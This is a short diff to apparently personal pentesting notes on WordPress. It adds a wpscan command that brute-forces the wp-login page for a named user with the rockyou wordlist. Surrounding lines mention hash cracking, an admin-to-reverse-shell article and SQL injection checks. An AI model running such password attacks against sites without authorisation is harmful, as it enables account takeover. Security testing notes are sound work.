@@ -8,6 +8,9 @@
 - Possble to use hashcat reverse hash (Not suggest)
 ## Wordpress authenicated admin to RCE
 - https://medium.com/@akshadjoshi/from-wordpress-to-reverse-shell-3857ee1f4896
+## password attack
+- ``` wpscan --url {url} --usernames "hoidam" --passwords /usr/share/wordlist/rockyou.txt -t 100 --password-attack wp-login ``` 
+
 
 # Non wordpress php
 - Check script if have sqli
